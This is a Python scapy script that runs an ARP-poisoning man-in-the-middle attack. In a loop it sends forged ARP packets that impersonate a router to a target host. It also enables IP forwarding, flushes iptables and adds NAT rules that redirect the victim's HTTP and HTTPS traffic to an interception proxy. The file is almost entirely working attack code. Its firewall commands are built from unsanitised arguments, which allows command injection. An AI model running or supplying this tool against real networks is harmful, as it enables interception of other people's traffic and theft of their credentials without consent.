#!/bin/python

#####################################
# Libs
#####################################

from scapy.all import *
import time
import argparse
import os
import sys
import getpass

#####################################
# Arguments
#####################################


# Get the current username
user = getpass.getuser() 

# Check if	the user is root
if user != "root":
	print "You need to be root to use me."
	sys.exit(1);

# Load the args
parser = argparse.ArgumentParser()
parser.add_argument('--destination', required=True, help="destination IP")
parser.add_argument('--router', default=None)
parser.add_argument('--iface', default='wlp6s0')
parser.add_argument('--fwconf', type=bool, default=True, help="Try to auto configure firewall")
parser.add_argument('--freq', type=float, default=1.0, help="frequency to send packets, in seconds")
parser.add_argument('--ports', default="80,443", help="comma seperated list of ports to forward to proxy")
parser.add_argument('--proxy', default=None)
parser.add_argument('--verbose', type=bool, default=True)
 
args = parser.parse_args()


#####################################
# Functions
#####################################

# Launch the poisoning
def arpPoison(args):
	# Select the net interface in the args
	conf.iface= args.iface
	# Create the packet
	pkt = ARP()
	# Set the router IP as source of the package
	pkt.psrc = args.router
	# Set the destinatione as dest
	pkt.pdst = args.destination
	
	# This try is here to be able to stop the while
	try:
		while 1:
			# Send the packets, and can be verbose if active
			send(pkt, verbose=args.verbose)
			# Wait the time defined in the arguments
			time.sleep(args.freq)
	# If it's interrupted, quit the while
	except KeyboardInterrupt:
		pass

# End function
#####################################

# PROTIP :
# default just grabs the default route, http://pypi.python.org/pypi/pynetinfo/0.1.9 would be better
# but this just works and people don't have to install external libs
def getDefRoute(args):
	# Store the result of the route command in the data var
	data = os.popen("/sbin/route -n ").readlines()
	# For each line of the return of the command
	for line in data:
		# If the current line start with this, and match the if of the args
		if line.startswith("0.0.0.0") and (args.iface in line):
			print "Setting route to the default: " + line.split()[1]
			# Save the IP adress of the Gateway in the args
			args.router = line.split()[1]
			# Exit point !
			return
	print "Error: unable to find default route"
	# Exit the script
	sys.exit(0)

# End function
#####################################


# Basically the same function as above, but for the IP of the source 
# get this info from the ifconfig
def getDefIP(args):
	data = os.popen("/sbin/ifconfig " + args.iface).readlines()
	for line in data:
		# / ! \
		# This condition may not work 
		if line.strip().startswith("inet "):
			print line
			args.proxy = line.split()[1].split()[0]
			print "setting proxy to: " + args.proxy
			return
	print "Error: unable to find default IP"
	sys.exit(0)

# End function
#####################################

def saveIPConfig():
	# Extraction of the current config into a tmp file
	os.system("/usr/sbin/iptables-save > /tmp/.iptables-save")
	print("IPTables config saved here :\n\
	/tmp/.iptables-save")

# End function
#####################################

def restoreIPConfig():
	# Restore the iptables config with the tmp file
	os.system("/usr/sbin/iptables-restore < /tmp/.iptables-save")
	print("IPTables config have been restored !")
	# Remove the tmp file
	os.system("rm /tmp/.iptables-save")

# End function
#####################################

# Configure IP tables
def fwconf(args):
	# write appropriate kernel config settings
	f = open("/proc/sys/net/ipv4/ip_forward", "w")
	# Put the IP forwarding flag to 1
	f.write('1')
	f.close()
	
	# Open the ip config
	f = open("/proc/sys/net/ipv4/conf/" + args.iface + "/send_redirects", "w")
	# Write the 0 flag to send redirects flags
	f.write('0')
	f.close()
 
	# Create the redirection w/ the iptables
	os.system("/sbin/iptables --flush")
	os.system("/sbin/iptables -t nat --flush")
	os.system("/sbin/iptables --zero")
	os.system("/sbin/iptables -A FORWARD --in-interface " +	args.iface + " -j ACCEPT")
	os.system("/sbin/iptables -t nat --append POSTROUTING --out-interface " + args.iface + " -j MASQUERADE")
	# Create the redirection for the ports specified in the args
	# Default values : 80 & 443
	for port in args.ports.split(","):
		os.system("/sbin/iptables -t nat -A PREROUTING -p tcp --dport " + port + " --jump DNAT --to-destination " + args.proxy)
 

# End function
#####################################


#####################################
# Code
#####################################

saveIPConfig()
 
# If the router is not defined -> Guess it
if args.router == None:
	getDefRoute(args)
# If the proxy is not defined -> Guess it
if args.proxy == None:
	getDefIP(args)
 
#do iptables rules
if args.fwconf:
	fwconf(args)
 
arpPoison(args)

restoreIPConfig()



